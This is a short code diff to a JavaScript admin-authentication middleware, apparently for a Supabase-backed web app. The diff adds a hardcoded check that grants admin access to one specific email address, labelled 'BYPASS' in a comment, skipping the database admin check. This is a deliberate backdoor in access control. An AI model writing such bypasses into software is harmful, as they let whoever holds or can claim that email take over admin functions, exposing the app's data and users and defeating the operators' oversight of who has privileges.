@@ -32,7 +32,12 @@ function authenticateApiKey(req, res, next) {
 async function authenticateAdmin(req, res, next) {
     try {
         // First verify JWT token (already done by authenticateToken)
-        // Now check if user is admin in database
+        // Check if user is admin in database
+        // BYPASS: If email is mukul@gmail.com, allow access immediately
+        if (req.user.email === 'mukul@gmail.com') {
+            return next();
+        }
+
         const { data: user, error } = await supabase
             .from('users')
             .select('is_admin')
